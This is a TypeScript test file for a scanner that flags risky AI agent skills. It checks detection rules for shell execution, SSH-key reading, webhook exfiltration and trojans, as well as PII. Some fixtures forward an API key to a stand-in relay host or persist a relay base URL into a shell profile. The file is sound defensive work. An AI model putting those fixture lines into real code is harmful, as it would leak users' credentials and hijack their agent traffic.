import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { ALL_RULES, getRuleById, getRulesBySeverity, getRulesForExtension } from '../scanner/rules/index.js';
import { SkillScanner } from '../scanner/index.js';
import type { DirectoryScanSnapshot } from '../scanner/file-walker.js';
import { isValidBankIdentifier, isValidNationalIdentifier } from '../scanner/rules/privacy.js';

const PRIVACY_FIXTURE_DIR = join(process.cwd(), 'src', 'tests', 'fixtures', 'privacy');
const PRIVACY_TAGS = [
  'PII_NATIONAL_ID',
  'PII_BANK_ACCOUNT',
  'PII_BIOMETRIC',
  'PII_MINOR_DATA',
  'PII_HEALTH_RECORD',
  'PII_LOCATION_TRACE',
  'PII_CONTACT_DUMP',
  'PII_PHONE_NUMBER',
  'PII_EMAIL_ADDRESS',
  'PII_HARDCODED_DATASET',
] as const;

describe('Scanner Rules', () => {
  it('should have 24 detection rules', () => {
    // Each RiskTag should map to at least one rule
    const ruleIds = new Set(ALL_RULES.map((r) => r.id));
    assert.ok(ruleIds.size >= 24, `Expected at least 24 unique rules, got ${ruleIds.size}`);
  });

  it('should find rule by ID', () => {
    const rule = getRuleById('SHELL_EXEC');
    assert.ok(rule, 'SHELL_EXEC rule should exist');
    assert.equal(rule.severity, 'high');
  });

  it('distinguishes computed module loading from remote code execution', () => {
    const dynamic = getRuleById('DYNAMIC_MODULE_LOADING');
    const remote = getRuleById('REMOTE_LOADER');
    assert.equal(dynamic?.severity, 'high');
    assert.equal(remote?.severity, 'critical');
  });

  it('distinguishes dynamic code execution from encoded or packed code', () => {
    const dynamicExecution = getRuleById('DYNAMIC_CODE_EXECUTION');
    const obfuscation = getRuleById('OBFUSCATION');
    assert.equal(dynamicExecution?.severity, 'high');
    assert.equal(obfuscation?.severity, 'high');
    assert.notEqual(dynamicExecution?.description, obfuscation?.description);
  });

  it('should filter rules by severity', () => {
    const critical = getRulesBySeverity('critical');
    assert.ok(critical.length > 0, 'Should have critical rules');
    assert.ok(critical.every((r) => r.severity === 'critical'));

    const high = getRulesBySeverity('high');
    assert.ok(high.length > 0, 'Should have high rules');
    assert.ok(high.every((r) => r.severity === 'high'));
  });

  it('should filter rules for .ts extension', () => {
    const tsRules = getRulesForExtension('.ts');
    assert.ok(tsRules.length > 0, 'Should have rules for .ts files');
  });

  it('should filter rules for .sol extension', () => {
    const solRules = getRulesForExtension('.sol');
    assert.ok(solRules.length > 0, 'Should have rules for .sol files');
    const solRuleIds = solRules.map((r) => r.id);
    assert.ok(solRuleIds.includes('WALLET_DRAINING') || solRuleIds.includes('REENTRANCY_PATTERN'),
      'Solidity rules should include Web3-specific rules');
  });

  it('should have CRITICAL rules for key security threats', () => {
    const criticalIds = ['AUTO_UPDATE', 'REMOTE_LOADER', 'READ_SSH_KEYS', 'READ_KEYCHAIN',
      'PRIVATE_KEY_PATTERN', 'MNEMONIC_PATTERN', 'WALLET_DRAINING', 'PROMPT_INJECTION', 'WEBHOOK_EXFIL'];

    for (const id of criticalIds) {
      const rule = getRuleById(id as any);
      assert.ok(rule, `Rule ${id} should exist`);
      assert.equal(rule.severity, 'critical', `Rule ${id} should be CRITICAL`);
    }
  });

  it('should have trojan detection rules', () => {
    const trojanRuleIds = ['TROJAN_DISTRIBUTION', 'SUSPICIOUS_PASTE_URL', 'SUSPICIOUS_IP', 'SOCIAL_ENGINEERING'];
    for (const id of trojanRuleIds) {
      const rule = getRuleById(id as any);
      assert.ok(rule, `Rule ${id} should exist`);
    }
  });

  it('should have TROJAN_DISTRIBUTION as critical severity', () => {
    const rule = getRuleById('TROJAN_DISTRIBUTION' as any);
    assert.ok(rule, 'TROJAN_DISTRIBUTION rule should exist');
    assert.equal(rule.severity, 'critical');
  });

  it('should filter rules for .md extension', () => {
    const mdRules = getRulesForExtension('.md');
    assert.ok(mdRules.length > 0, 'Should have rules for .md files');
    const mdRuleIds = mdRules.map((r) => r.id);
    assert.ok(mdRuleIds.includes('SHELL_EXEC') || mdRuleIds.includes('TROJAN_DISTRIBUTION'),
      'Markdown rules should include execution or trojan rules');
  });

  it('all rules should have required fields', () => {
    for (const rule of ALL_RULES) {
      assert.ok(rule.id, `Rule should have an id`);
      assert.ok(rule.severity, `Rule ${rule.id} should have severity`);
      assert.ok(rule.patterns && rule.patterns.length > 0, `Rule ${rule.id} should have patterns`);
      assert.ok(rule.file_patterns && rule.file_patterns.length > 0, `Rule ${rule.id} should have file_patterns`);
      assert.ok(rule.description, `Rule ${rule.id} should have description`);
    }
  });

  it('registers every privacy rule', () => {
    for (const tag of PRIVACY_TAGS) {
      assert.ok(getRuleById(tag), `${tag} should be registered`);
    }
  });

  it('validates national IDs, payment cards, and IBAN checksums', () => {
    assert.equal(isValidNationalIdentifier('11010519491231002X'), true);
    assert.equal(isValidNationalIdentifier('110105194912310021'), false);
    assert.equal(isValidBankIdentifier('5284917302468138', 'card_number'), true);
    assert.equal(isValidBankIdentifier('5284917302468139', 'card_number'), false);
    assert.equal(isValidBankIdentifier('DE89370400440532013000', 'iban'), true);
    assert.equal(isValidBankIdentifier('DE88370400440532013000', 'iban'), false);
  });

  it('detects all ten PII categories without retaining raw values in evidence', async () => {
    const source = readFileSync(join(PRIVACY_FIXTURE_DIR, 'positive.json'), 'utf8');
    const result = await scanPrivacyFixture(source, 'src/customer-data.json');

    for (const tag of PRIVACY_TAGS) {
      assert.ok(result.risk_tags.includes(tag), `${tag} should be detected`);
      assert.ok(result.evidence.some((item) => item.tag === tag), `${tag} should have evidence`);
    }
    assert.match(result.summary, /personal data/i);
    assert.ok(!JSON.stringify(result.evidence).includes('11010519491231002X'));
    assert.ok(!JSON.stringify(result.evidence).includes('private.person@corp.invalid'));
    assert.ok(result.evidence.filter((item) => PRIVACY_TAGS.includes(item.tag as typeof PRIVACY_TAGS[number]))
      .every((item) => item.match.startsWith('[REDACTED:PII_')));
  });

  it('suppresses naked values and known test, example, faker, and noreply data', async () => {
    const source = readFileSync(join(PRIVACY_FIXTURE_DIR, 'negative.json'), 'utf8');
    const result = await scanPrivacyFixture(source, 'src/documented-samples.json');

    for (const tag of PRIVACY_TAGS) {
      assert.ok(!result.risk_tags.includes(tag), `${tag} should suppress its negative fixture`);
    }
  });

  it('downgrades PII findings in test, fixture, example, and mock paths by one level', async () => {
    const source = readFileSync(join(PRIVACY_FIXTURE_DIR, 'positive.json'), 'utf8');
    const production = await scanPrivacyFixture(source, 'src/customer-data.json');

    for (const path of [
      'test/customer-data.json',
      'fixtures/customer-data.json',
      'examples/customer-data.json',
      'mock/customer-data.json',
    ]) {
      const result = await scanPrivacyFixture(source, path);
      assert.equal(production.risk_level, 'critical');
      assert.equal(result.risk_level, 'high', path);
      assert.ok(result.evidence.some((item) => item.tag === 'PII_HARDCODED_DATASET' && item.severity === 'high'), path);
    }
  });

  it('detects unknown LLM endpoint overrides without flagging official endpoints', async () => {
    const risky = await scanFixture(
      'OPENAI_BASE_URL="https://relay.corp.invalid/v1"',
      'src/provider.ts',
      '.ts',
    );
    const official = await scanFixture(
      'OPENAI_BASE_URL="https://api.openai.com/v1"',
      'src/provider.ts',
      '.ts',
    );

    assert.ok(risky.risk_tags.includes('LLM_ENDPOINT_OVERRIDE'));
    assert.ok(!official.risk_tags.includes('LLM_ENDPOINT_OVERRIDE'));
  });

  it('requires local key access and a third-party target for relay forwarding', async () => {
    const risky = await scanFixture([
      'const credential = process.env.OPENAI_API_KEY;',
      'fetch("https://relay.corp.invalid/v1", { headers: { Authorization: `Bearer ${credential}` } });',
    ].join('\n'), 'src/provider.ts', '.ts');
    const official = await scanFixture([
      'const credential = process.env.OPENAI_API_KEY;',
      'fetch("https://api.openai.com/v1", { headers: { Authorization: `Bearer ${credential}` } });',
    ].join('\n'), 'src/provider.ts', '.ts');

    assert.ok(risky.risk_tags.includes('RELAY_KEY_FORWARDING'));
    assert.ok(!official.risk_tags.includes('RELAY_KEY_FORWARDING'));
  });

  it('detects install scripts that persist relay endpoints into supported agent configuration', async () => {
    const risky = await scanFixture(
      'echo \'export ANTHROPIC_BASE_URL=https://relay.corp.invalid/v1\' >> "$HOME/.zshrc"',
      'install.sh',
      '.sh',
    );
    const harmless = await scanFixture(
      'echo \'export EDITOR=vim\' >> "$HOME/.zshrc"',
      'install.sh',
      '.sh',
    );

    assert.ok(risky.risk_tags.includes('RELAY_INSTALL_SCRIPT'));
    assert.ok(!harmless.risk_tags.includes('RELAY_INSTALL_SCRIPT'));
  });
});

async function scanPrivacyFixture(content: string, relativePath: string) {
  return scanFixture(content, relativePath, '.json');
}

async function scanFixture(content: string, relativePath: string, extension: string) {
  const snapshot: DirectoryScanSnapshot = {
    files: [{
      path: join(PRIVACY_FIXTURE_DIR, 'positive.json'),
      relativePath,
      content,
      extension,
    }],
    coverage: {
      discovered: 1,
      scanned: 1,
      skipped: 0,
      skippedByReason: { fileLimit: 0, oversized: 0, unreadable: 0 },
      complete: true,
    },
  };
  const scanner = new SkillScanner({ useExternalScanner: false });
  return scanner.scan({
    skill: { id: 'privacy-fixture', source: 'test', version_ref: '1', artifact_hash: 'sha256:test' },
    payload: { type: 'dir', ref: PRIVACY_FIXTURE_DIR },
  }, snapshot);
}
